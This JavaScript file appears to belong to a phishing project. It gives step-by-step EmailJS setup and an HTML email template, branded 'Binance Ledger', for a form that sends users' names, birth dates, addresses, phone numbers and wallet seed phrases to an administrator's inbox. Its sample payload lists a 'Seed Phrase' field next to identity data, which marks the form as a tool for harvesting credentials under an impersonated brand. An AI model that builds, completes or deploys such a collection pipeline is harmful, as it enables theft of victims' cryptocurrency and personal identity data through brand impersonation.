
/**
 * EmailJS Template Guide
 * 
 * This file provides a guide for setting up your EmailJS template.
 * You'll need to create a template in your EmailJS dashboard that matches this structure.
 */

/**
 * EmailJS Template Variables
 * 
 * When setting up your template in EmailJS, use these variables in your template design:
 * 
 * {{from_name}} - The user's full name (first + last name)
 * {{from_email}} - The user's email address
 * {{subject}} - Email subject
 * {{message}} - The formatted message containing all form data
 * 
 * Note: Our form sends these to the recipient email you specify in EmailJS
 */

/**
 * Example Template HTML
 * 
 * Copy and paste this into your EmailJS template editor:
 */

const exampleTemplateHtml = `
<!DOCTYPE html>
<html>
<head>
  <title>Binance Ledger Form Submission</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      line-height: 1.6;
      color: #333;
      max-width: 600px;
      margin: 0 auto;
      padding: 20px;
    }
    .header {
      background-color: #F0B90B;
      color: #000;
      padding: 15px;
      text-align: center;
      border-radius: 5px 5px 0 0;
    }
    .content {
      background-color: #f9f9f9;
      padding: 20px;
      border: 1px solid #ddd;
      border-top: none;
      border-radius: 0 0 5px 5px;
    }
    .footer {
      margin-top: 20px;
      font-size: 12px;
      text-align: center;
      color: #777;
    }
    .alert {
      background-color: #ffeeee;
      border-left: 4px solid #ff4444;
      padding: 10px;
      margin: 15px 0;
    }
    .data-row {
      margin-bottom: 10px;
      border-bottom: 1px solid #eee;
      padding-bottom: 5px;
    }
    .label {
      font-weight: bold;
    }
  </style>
</head>
<body>
  <div class="header">
    <h2>Binance Ledger Form Submission</h2>
  </div>
  <div class="content">
    <p>A new Binance Ledger form has been submitted with the following details:</p>
    
    <div class="data-row">
      <span class="label">Name:</span> {{from_name}}
    </div>
    
    <div class="data-row">
      <span class="label">Email:</span> {{from_email}}
    </div>
    
    <div class="data-row">
      <span class="label">All Form Data:</span>
      <pre style="white-space: pre-wrap;">{{message}}</pre>
    </div>
    
    <div class="alert">
      <p><strong>Important:</strong> This submission contains sensitive information. Handle with care and according to your security protocols.</p>
    </div>
  </div>
  <div class="footer">
    <p>This is an automated message from your Binance Ledger Form application.</p>
  </div>
</body>
</html>
`;

/**
 * Setup Instructions:
 * 
 * 1. Create an EmailJS account at emailjs.com if you don't already have one
 * 2. Set up an email service (like Gmail, Outlook, etc.)
 * 3. Create a new template
 * 4. Copy the HTML above into your template
 * 5. In the "To Email" field of your template settings, enter your admin email address
 * 6. Set "From Email" to {{from_email}}
 * 7. Set "From Name" to {{from_name}}
 * 8. Save the template and note down the Template ID
 * 9. Also note down your Service ID and User ID
 * 10. Enter these IDs in your application's EmailJS configuration page
 */

export const templateParams = {
  to_email: "donotreply@binanceledger.com", // This will be overridden by your template settings
  from_name: "User's Full Name", // Will be replaced with actual user's name
  from_email: "user@example.com", // Will be replaced with actual user's email
  subject: "New Binance Ledger Form Submission",
  message: `
    Name: John Doe
    Date of Birth: 2000-01-01
    Email: user@example.com
    Phone: 0123456789
    Address: 123 Main St
    Zip Code: 12345
    City: Example City
    Country: Example Country
    Seed Phrase: [SENSITIVE INFORMATION]
  `,
};

/**
 * NOTE: This is only a guide. No actual emails are sent from this file.
 * You must set up EmailJS in your account dashboard using these variables.
 */
